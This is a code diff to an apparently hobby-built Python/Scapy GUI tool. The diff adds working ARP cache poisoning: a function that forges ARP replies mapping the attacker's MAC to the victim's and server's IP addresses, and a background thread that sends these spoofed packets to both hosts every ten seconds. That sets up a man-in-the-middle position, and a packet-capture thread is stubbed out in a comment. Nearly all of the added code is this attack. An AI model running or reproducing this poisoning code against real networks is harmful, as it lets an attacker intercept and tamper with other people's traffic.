@@ -4,9 +4,18 @@ import threading
 import time
 
 def GetMacFromIp(targetip):
-    arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
-    targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
+    arppacket= Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(op = 1, pdst = targetip)
+    targetmac= srp(arppacket, timeout=2 , verbose= False, iface = "enp0s3")[0][0][1].hwsrc
     return targetmac
+
+def GeneratePacket(selfMac, serverIp, victimMac, victimIp):
+    r = Ether()/ARP()
+    r[Ether].src = selfMac
+    r[ARP].hwsrc = selfMac
+    r[ARP].psrc  = serverIp
+    r[ARP].hwdst = victimMac
+    r[ARP].pdst  = victimIp
+    return r
 
 class Application(Frame):
     def __init__(self, master = None):
@@ -52,7 +61,34 @@ class Application(Frame):
     def startArp(self):
         self.victimIp  = self.uArpEntryIpVictim.get()
         self.victimMac = GetMacFromIp(self.victimIp)
+
+        self.serverIp = self.uArpEntryIpServer.get()
+        self.serverMac = GetMacFromIp(self.serverIp)
+
+        # start a sepparate thread for continously poisoning the targets
+        poison_t = threading.Thread(target = self.arp_poison)
+        poison_t.daemon = True
+        poison_t.start()
+
+        # start capturing thread
+        #capture_t = threading.Thread(target = self.capture_packets)
         
+    def arp_poison(self):
+        while True:
+            if self.victimIp == self.serverIp:
+                print "Error in Scapper/poison_t: Match between server and victim IP."
+                return
+            else:
+                packet = GeneratePacket(self.selfMac, self.serverIp, self.victimMac, self.victimIp)
+                sendp(packet, verbose = False, iface = self.networkInterface)
+
+                packet = GeneratePacket(self.selfMac, self.victimIp, self.serverMac, self.serverIp)
+                sendp(packet, verbose = False, iface = self.networkInterface)
+
+                print "[ARP] Poisoning ARP cache of: " + str([self.victimIp, self.serverIp])
+            time.sleep(10)
+
+    
     
     def exit(self):
         root.destroy()
